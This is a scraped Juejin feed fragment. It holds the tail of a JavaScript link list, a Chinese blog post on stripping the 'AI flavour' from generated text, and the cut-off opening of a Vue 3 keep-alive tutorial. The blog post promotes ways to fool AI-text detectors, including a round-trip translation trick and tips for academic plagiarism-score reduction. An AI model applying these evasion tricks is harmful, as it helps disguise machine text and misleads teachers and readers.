<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavascript.tm%2Fletter" target="_blank" title="https://javascript.tm/letter" ref="nofollow noopener noreferrer">JavaScript 商标争议公开信</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavascript.tm%2F" target="_blank" title="https://javascript.tm/" ref="nofollow noopener noreferrer">JavaScript 商标争议官网</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.espruino.com%2F" target="_blank" title="https://www.espruino.com/" ref="nofollow noopener noreferrer">Espruino - 嵌入式 JavaScript</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.techspot.com%2Fnews%2F110510-javascript-turns-30-10-day-prototype-backbone-modern.html" target="_blank" title="https://www.techspot.com/news/110510-javascript-turns-30-10-day-prototype-backbone-modern.html" ref="nofollow noopener noreferrer">JavaScript Turns 30 - TechSpot</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.to%2Fgochev%2F30-years-of-javascript-the-complete-evolution-guide-haa" target="_blank" title="https://dev.to/gochev/30-years-of-javascript-the-complete-evolution-guide-haa" ref="nofollow noopener noreferrer">30 Years of JavaScript: The Complete Evolution Guide</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeno.com%2Fblog%2Fdeno-v-oracle" target="_blank" title="https://deno.com/blog/deno-v-oracle" ref="nofollow noopener noreferrer">Deno v. Oracle</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fbrendan-eich-on-creating-javascript-in-10-days-and-what-hed-do-differently-today%2F" target="_blank" title="https://thenewstack.io/brendan-eich-on-creating-javascript-in-10-days-and-what-hed-do-differently-today/" ref="nofollow noopener noreferrer">Brendan Eich on Creating JavaScript in 10 Days</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拒绝一眼假！高效洗掉AI文章的“机器味”（附去机器化实战指南）]]></title>    <link>https://juejin.cn/post/7580263284337868841</link>    <guid>https://juejin.cn/post/7580263284337868841</guid>    <pubDate>2025-12-06T11:44:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580263284337868841" data-draft-id="7580287383788093483" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拒绝一眼假！高效洗掉AI文章的“机器味”（附去机器化实战指南）"/> <meta itemprop="keywords" content="AIGC,AI编程"/> <meta itemprop="datePublished" content="2025-12-06T11:44:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="技术更好说"/> <meta itemprop="url" content="https://juejin.cn/user/2735240657517816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拒绝一眼假！高效洗掉AI文章的“机器味”（附去机器化实战指南）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2735240657517816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    技术更好说
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T11:44:04.000Z" title="Sat Dec 06 2025 11:44:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>承认吧。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50c3b055e61f416484bf6f3f2d71e4b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv5pu05aW96K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765626244&amp;x-signature=Qk0D31Gsg59zqFuzUCcQiP4c0Zs%3D" alt="Gemini_Generated_Image_dneo53dneo53dneo.png" loading="lazy"/></p>
<p>你刚读的那段文字，逻辑完美得像刚出厂的不锈钢盆，但读起来像嚼蜡。这就是“AI味”。在这个满大街GPT-4和DeepSeek的年代，写出一段通顺的话不值钱，能写出“人味”才是稀缺资源。</p>
<p>这篇东西不是教你怎么微调参数，是教你如何给你的文字“去油”。</p>
<h2 data-id="heading-0">一、 为什么AI写的东西像个只会点头的客服？</h2>
<p>AI本质上是个怂包。</p>
<p>它是一个概率预测机。在它的算法里，它永远倾向于选择那个<strong>概率最高</strong>、<strong>最安全</strong>的词。这叫“均值回归”。这就好比你去饭馆点菜，AI永远只敢点西红柿炒蛋，因为这道菜绝不会出错。但人类不一样，人类会因为心情不好点个变态辣，或者因为想起前任突然来句脏话。</p>
<p>这种为了“安全”和“有用”而被阉割掉的随机性，就是AI味的根源。它想讨好所有人，结果就是谁也打动不了。</p>
<h2 data-id="heading-1">二、 破局的两个硬指标：困惑度与爆发度</h2>
<p>想骗过检测器？或者单纯想让读者觉得你是个活人？死磕这两个词：</p>
<h3 data-id="heading-2">1. 困惑度 (Perplexity)：玩的就是心跳</h3>
<p>AI写文章像走正步，每一步都在你预料之中。</p>
<p>人写文章像跑酷。</p>
<ul>
<li>
<p><strong>AI写法</strong>：“我非常喜欢阅读，因为书籍是人类进步的阶梯。”（困惑度低，听得我想睡）</p>
</li>
<li>
<p><strong>人话</strong>：“书这玩意儿，那是我的精神鸦片。”（困惑度高，AI想不到你会把书比作毒品）</p>
</li>
</ul>
<p>你要做的，就是强制把低概率词塞进去。哪怕偶尔语法不通，也比平庸强。</p>
<h3 data-id="heading-3">2. 爆发度 (Burstiness)：别当节拍器</h3>
<p>AI的句子长度呈现完美的正态分布。中句、中句、长句。节奏稳得像催眠曲。</p>
<p>人类的节奏是乱的。</p>
<ul>
<li>
<p><strong>AI</strong>：虽然天气很冷，但是我们依然坚持工作，因为这对项目很重要。</p>
</li>
<li>
<p><strong>人话</strong>：冷死。但还得干。没办法，项目要死人了。</p>
</li>
</ul>
<p><strong>你要学会“长短脚”走路。</strong> 连续两个长难句把逻辑铺开，然后突然用两三个字的短句截断。这种顿挫感，AI装不出来。</p>
<h2 data-id="heading-4">三、 中文特供：治治你的“翻译腔”</h2>
<p>现在的国产大模型，骨子里还是喝洋墨水长大的。它们生成的中文，其实是“汉化的英文”。</p>
<ol>
<li><strong>砍掉连接词</strong>：</li>
</ol>
<p>英语是形合语言，没连接词会死。中文是意合语言，靠的是逻辑粘连。</p>
<ul>
<li>
<p><em>AI</em>：“<strong>当</strong>你打开它时，<strong>你会</strong>发现...”</p>
</li>
<li>
<p><em>人话</em>：“打开它，你会发现...”</p>
</li>
<li>
<p>把所有的“因此”、“然而”、“此外”、“综上所述”统统删掉。你是在聊天，不是在写申论。</p>
</li>
</ul>
<ol start="2">
<li><strong>拒绝主语依赖症</strong>：</li>
</ol>
<p>AI恨不得每句话都加上“我”、“我们”、“它”。</p>
<ul>
<li>
<p><em>AI</em>：“我们认为这个方案很好，因为它解决了我们的痛点。”</p>
</li>
<li>
<p><em>人话</em>：“这方案行，痛点没了。”</p>
</li>
</ul>
<ol start="3">
<li><strong>别当“爹”</strong>：</li>
</ol>
<p>AI总喜欢在结尾升华一下，“让我们携手共进”、“未来可期”。这种正确的废话，看着就想吐。</p>
<p><strong>结尾直接停住。</strong> 哪怕留个悬念，或者发句牢骚，都比强行升华强。</p>
<h2 data-id="heading-5">四、 避雷指南：只要出现这些词，你就输了</h2>
<p>把这些词刻在烟盒上，看见就划掉：</p>
<ul>
<li>
<p><strong>幻觉系</strong>：织锦 (Tapestry)、交响曲、灯塔、画卷。你要不是在写中世纪奇幻小说，就别用这些词。</p>
</li>
<li>
<p><strong>学术装X系</strong>：深入探讨 (Delve)、领域 (Realm)、旨在、致力于。把“深入探讨”改成“聊聊”，把“领域”改成“圈子”。</p>
</li>
<li>
<p><strong>废话系</strong>：不仅仅是...更是...、值得注意的是、至关重要。</p>
</li>
</ul>
<h2 data-id="heading-6">五、 怎么改？（这才是干货）</h2>
<p>别指望一句“请写得像人”就能搞定。你得下狠手。</p>
<h3 data-id="heading-7">招数1：负向提示词 (Negative Constraints)</h3>
<p>直接给AI上镣铐。</p>
<blockquote>
<p>“禁止使用‘综上所述’、‘深入探讨’、‘多面手’。禁止使用‘首先、其次、最后’的列表结构。禁止在结尾升华主题。句子长度必须长短交替，方差要大。”</p>
</blockquote>
<h3 data-id="heading-8">招数2：角色扮演 (Roleplay)</h3>
<p>别让它当助手，让它当个混不吝的老炮儿。</p>
<blockquote>
<p>“你是一个干了10年的老油条，性格直率，嘴有点损。你在给哥们写微信。用口语，多用反问句，夹杂点情绪（比如吐槽）。别跟我讲大道理。”</p>
</blockquote>
<h3 data-id="heading-9">招数3：数字洗钱法 (The Translation Hack)</h3>
<p>这是个笨办法，但贼好用。</p>
<ol>
<li>
<p>把中文草稿丢进翻译软件，转成<strong>德语</strong>（改句式结构）。</p>
</li>
<li>
<p>把德语转成<strong>西班牙语</strong>（加点罗曼语系的啰嗦）。</p>
</li>
<li>
<p>把西班牙语转回<strong>中文</strong>。</p>
</li>
<li>
<p>这时候出来的中文肯定是个半残废。你要做的就是像修补匠一样，把不通顺的地方改顺。经过这一轮折腾，原文的统计特征全碎了，检测器根本查不出来。</p>
</li>
</ol>
<h2 data-id="heading-10">六、 场景化实战</h2>
<ul>
<li>
<p><strong>小红书</strong>：Emoji浓度要高，情绪要满。别说“这个产品很好”，要说“绝了！😭谁懂啊家人们！”。一定要有感官描述，比如“摸起来像撸猫”。</p>
</li>
<li>
<p><strong>邮件</strong>：别寒暄。第一句就说事。别说“希望这封邮件找到你时一切安好”，直接说“附件是你要的表，请查收。”</p>
</li>
<li>
<p><strong>学术降重</strong>：把所有形容词都删了。别说“巨大的成功”，说“销售额涨了200%”。用事实代替修饰。</p>
</li>
</ul>
<h2 data-id="heading-11">听懂了吗？</h2>
<p>别试图把AI变成人，它做不到。</p>
<p>你要做的是做一个暴君，强迫它跳出舒适区，逼它说人话。</p>
<h2 data-id="heading-12">拿来即用：去“AI味”通用指令包</h2>
<p>文章里讲的是心法，为了让你省去调试的时间，我整理好了可以直接落地的“招式”。</p>
<p>这个资料不仅仅是提示词，还包含了针对 DeepSeek R1 和 Claude 、Gemini的特定微调参数。</p>
<p>因为模型更新很快，为了防止内容过时，我将源码放在了腾讯文档里，方便随时维护。</p>
<p>🔗 完整版自取通道： 关注公号【技术更好说】发送消息”去AI味”。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 Keep-Alive 深度实践：从原理到最佳实践]]></title>    <link>https://juejin.cn/post/7580297762189983785</link>    <guid>https://juejin.cn/post/7580297762189983785</guid>    <pubDate>2025-12-06T09:47:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580297762189983785" data-draft-id="7580263284337737769" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 Keep-Alive 深度实践：从原理到最佳实践"/> <meta itemprop="keywords" content="Vue.js,vue-router"/> <meta itemprop="datePublished" content="2025-12-06T09:47:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cindershade"/> <meta itemprop="url" content="https://juejin.cn/user/2587590326494763"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 Keep-Alive 深度实践：从原理到最佳实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2587590326494763/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cindershade
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:47:49.000Z" title="Sat Dec 06 2025 09:47:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 Keep-Alive 深度实践：从原理到最佳实践</h2>
<h3 data-id="heading-1">前言</h3>
<p>初入职场，我被安排用 Vue3 制作公司官网，有 5-6 个静态页面。开发完成后，领导在测试时提出一个问题：“为什么页面滑动后再切换到其它页面，返回时没有回到顶部？”调试后发现，是因为使用了 <code>&lt;keep-alive&gt;</code> 组件缓存页面导致的。这引发了我对 Vue 3 Keep-Alive 的浓厚兴趣。Keep-Alive 能帮助我们在页面间切换时保留组件的状态，使用户体验更加流畅。特别是在带有筛选和滚动列表的页面中，使用 Keep-Alive 可以在返回时保留用户之前的筛选条件和滚动位置，无需重新加载或初始化。</p>
<p>在本文中，我将结合实例，从基础到深入地解析 Vue 3 中的 Keep-Alive 组件原理、常见问题及最佳实践，帮助大家全面掌握这一功能。</p>
<hr/>
<h3 data-id="heading-2">一、了解 Keep-Alive：什么是组件缓存？</h3>
<h4 data-id="heading-3">1.1 Keep-Alive 的本质</h4>
<p><code>&lt;keep-alive&gt;</code> 是 Vue 的内置组件，用于缓存组件实例，避免在切换时重复创建和销毁组件实例。换言之，当组件被包裹在 <code>&lt;keep-alive&gt;</code> 中离开视图时，它不会被销毁，而是进入缓存；再次访问时，该组件实例会被重新激活，状态依然保留。</p>
<p><strong>示例场景</strong>：用户从列表页进入详情页后再返回列表页。</p>
<p><strong>没有 Keep-Alive 的情况</strong>：</p>
<ul>
<li>
<p>用户操作：首页 → 探索页 → 文章详情 → 探索页</p>
</li>
<li>
<p>组件生命周期：</p>
<ul>
<li>首页：创建 → 挂载 → 销毁</li>
<li>探索页：创建 → 挂载 → 销毁 → 重新创建 → 重新挂载</li>
<li>文章详情：创建 → 挂载 → 销毁</li>
<li>探索页（再次）：重新创建 → 重新挂载（状态丢失）</li>
</ul>
</li>
</ul>
<p><strong>有 Keep-Alive 的情况</strong>：</p>
<ul>
<li>
<p>用户操作：首页 → 探索页 → 文章详情 → 探索页</p>
</li>
<li>
<p>组件生命周期：</p>
<ul>
<li>首页：创建 → 挂载 → 停用（缓存）</li>
<li>探索页：创建 → 挂载 → 停用（缓存）</li>
<li>文章详情：创建 → 挂载 → 销毁</li>
<li>探索页（再次）：激活（从缓存恢复，状态保持）</li>
</ul>
</li>
</ul>
<p>使用 <code>&lt;keep-alive&gt;</code> 包裹的组件，在离开时不会销毁，而是进入「停用（deactivated）」状态；再次访问时触发「激活（activated）」状态，原先所有的响应式数据都仍然保留。这意味着，探索页中的筛选条件和滚动位置都还能保留在页面返回时显示，提高了用户体验。</p>
<h4 data-id="heading-4">1.2 Keep-Alive 的工作原理</h4>
<p>Keep-Alive 通过以下机制来实现组件缓存：</p>
<ul>
<li><strong>缓存机制</strong>：当组件从视图中被移除时，如果包裹在 <code>&lt;keep-alive&gt;</code> 中，组件实例不会被销毁，而是存放在内存中。下次访问该组件时，直接复用之前缓存的实例。</li>
<li><strong>生命周期钩子</strong>：被缓存组件在进入和离开时，会触发两个特殊的钩子 —— <code>onActivated</code> / <code>onDeactivated</code> 或 <code>activated</code> / <code>deactivated</code>。可以在这些钩子中执行恢复或清理操作，例如刷新数据或保存状态。</li>
<li><strong>组件匹配</strong>：<code>&lt;keep-alive&gt;</code> 默认会缓存所有包裹其中的组件实例。但如果需要精确控制，就会用到 <code>include</code>、<code>exclude</code> 属性，匹配组件的 <code>name</code> 选项来决定是否缓存。注意，这里的匹配依赖于组件的 <code>name</code> 属性，与路由配置无关。</li>
</ul>
<h4 data-id="heading-5">1.3 核心属性</h4>
<ul>
<li><code>include</code>：字符串、正则或数组，只有 <code>name</code> 匹配的组件才会被缓存。</li>
<li><code>exclude</code>：字符串、正则或数组，<code>name</code> 匹配的组件将不会被缓存。</li>
<li><code>max</code>：数字，指定最多缓存多少个组件实例，超过限制时会删除最近最少使用的实例。</li>
</ul>
<p>注意：<code>include</code>/<code>exclude</code> 匹配的是组件的 <code>name</code> 选项。在 Vue 3.2.34 及以后，如果使用了 <code>&lt;script setup&gt;</code>，组件会自动根据文件名推断出 <code>name</code>，无需手动声明。</p>
<hr/>
<h3 data-id="heading-6">二、使用 Keep-Alive：基础到进阶</h3>
<h4 data-id="heading-7">2.1 基础使用</h4>
<p>最简单的使用方式是将动态组件放在 <code>&lt;keep-alive&gt;</code> 里面：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;keep-alive&gt;
    &lt;component :is="currentComponent" /&gt;
  &lt;/keep-alive&gt;
&lt;/template&gt;
</code></pre>
<p>这样每次切换 <code>currentComponent</code> 时，之前的组件实例会被缓存，状态不会丢失。</p>
<h4 data-id="heading-8">2.2 在 Vue Router 中使用</h4>
<p>在 Vue Router 配置中，为了让路由页面支持缓存，需要将 <code>&lt;keep-alive&gt;</code> 放在 <code>&lt;router-view&gt;</code> 的插槽中：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;router-view v-slot="{ Component }"&gt;
    &lt;keep-alive&gt;
      &lt;component :is="Component" /&gt;
    &lt;/keep-alive&gt;
  &lt;/router-view&gt;
&lt;/template&gt;
</code></pre>
<p>这样 <code>&lt;keep-alive&gt;</code> 缓存的是路由对应的组件，而非 <code>&lt;router-view&gt;</code> 自身。不要包裹整个 <code>&lt;router-view&gt;</code>，而是通过插槽嵌套其渲染的组件。</p>
<h4 data-id="heading-9">2.3 使用 include 精确控制</h4>
<p>如果只想缓存特定组件，可利用 <code>include</code> 属性：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;router-view v-slot="{ Component }"&gt;
    &lt;keep-alive include="Home,Explore"&gt;
      &lt;component :is="Component" /&gt;
    &lt;/keep-alive&gt;
  &lt;/router-view&gt;
&lt;/template&gt;
</code></pre>
<p><code>include</code> 中的名称必须与组件的 <code>name</code> 完全一致，否则不起作用。</p>
<h4 data-id="heading-10">2.4 滑动位置缓存示例</h4>
<p>以“探索”列表页为例：用户在该页设置筛选条件并滚动列表后，跳转到文章详情页，再返回“探索”页。如果没有使用 Keep-Alive，列表页组件会被重新创建，筛选条件和滚动位置会重置。</p>
